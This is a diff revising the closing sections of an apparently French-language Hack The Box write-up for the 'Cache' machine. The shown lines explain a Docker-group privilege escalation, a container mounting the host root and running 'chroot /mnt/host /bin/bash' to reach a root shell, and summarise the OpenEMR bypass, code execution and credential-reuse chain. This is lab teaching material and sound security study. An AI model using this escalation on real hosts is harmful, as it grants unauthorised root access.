+Cette commande crée un conteneur interactif à partir de l’image `ubuntu:latest`, monte la racine `/` de l’hôte sous `/mnt/host`, puis lance un shell Bash en considérant ce répertoire comme sa nouvelle racine grâce à `chroot`.
+
+
 
 Cette commande se décompose ainsi :
 
@@ -2045,16 +2078,16 @@ indique l’image utilisée pour créer le conteneur ;
 chroot /mnt/host /bin/bash
 ```
 
-utilise `/mnt/host` comme nouvelle racine du système de fichiers et lance `/bin/bash` dans cette arborescence, qui correspond ici à celle de la machine hôte.
+lance un shell Bash en utilisant `/mnt/host` comme nouvelle racine du système de fichiers.
 
-La commande réussit à monter la racine complète de la machine hôte dans le conteneur. `chroot` permet ensuite d’utiliser cette arborescence comme nouvelle racine et d’y lancer un shell avec les privilèges de `root`.
-
-Tu peux le vérifier avec :
+La commande réussit et ouvre un shell en utilisant le système de fichiers de l’hôte comme racine.
 
 ```
 root@c28626745b44:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+La sortie confirme que le shell s’exécute avec les privilèges de `root`.
 
 ### root.txt
 
@@ -2071,23 +2104,20 @@ La lecture de `root.txt` marque la fin de l’exploitation : la machine est dés
 
 **Cache** propose une exploitation progressive dans laquelle plusieurs informations qui paraissent initialement secondaires deviennent indispensables par la suite.
 
-L’énumération du site `cache.htb` permet tout d’abord de découvrir `hms.htb`, qui héberge une installation d’**OpenEMR**. L’identification de sa version, puis l’exploitation des vulnérabilités correspondantes, permettent d’obtenir un premier shell sous le compte `www-data`.
+L’énumération du site `cache.htb` permet tout d’abord de découvrir `hms.htb`, qui héberge une installation d’**OpenEMR**. L’identification de sa version, puis l’exploitation d’un contournement d’authentification et d’une vulnérabilité d’exécution de code, permettent d’obtenir un premier shell sous le compte `www-data`.
 
-La réutilisation des identifiants découverts pendant l’énumération Web permet ensuite de passer au compte `ash` et de récupérer `user.txt`.
+La réutilisation des identifiants découverts pendant l’énumération web permet ensuite de passer au compte `ash` et de récupérer `user.txt`.
 
-L’énumération locale révèle alors un service **Memcached** accessible uniquement depuis l’interface loopback. Son contenu fournit les identifiants du compte `luffy`, qui appartient au groupe `docker`.
+L’énumération locale révèle alors un service **Memcached** accessible uniquement depuis l’interface loopback. Son contenu fournit les identifiants du compte `luffy`, dont l’appartenance au groupe `docker` ouvre la voie à l’escalade de privilèges.
 
-Ces droits permettent de lancer un conteneur en montant le système de fichiers de l’hôte, puis d’utiliser `chroot` pour travailler directement dans celui-ci avec les privilèges accordés au processus du conteneur. Tu peux ainsi accéder à `/root`, récupérer `root.txt` et terminer la compromission de la machine.
+L’accès à Docker permet alors de lancer un conteneur en montant la racine du système de fichiers de l’hôte, puis d’utiliser `chroot` pour travailler directement dans cette arborescence avec les privilèges de `root`. Tu peux ainsi accéder à `/root`, récupérer `root.txt` et terminer la compromission de la machine.
 
-Cache illustre particulièrement bien l’intérêt de ne pas limiter l’énumération aux services directement accessibles depuis l’extérieur : découverte d’un hôte virtuel, réutilisation d’identifiants, inspection des services locaux et analyse des groupes de l’utilisateur constituent ici les différentes étapes d’une même chaîne d’exploitation.
+Cache illustre particulièrement bien l’intérêt de ne pas limiter l’énumération aux services accessibles depuis l’extérieur. La découverte d’un hôte virtuel, la réutilisation d’identifiants, l’inspection des services locaux et l’analyse des groupes de l’utilisateur constituent ici les différentes étapes d’une même chaîne d’exploitation.
 
 
 
 ---
 
-## Pièces jointes (optionnel)
 
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
 
 {{< feedback >}}
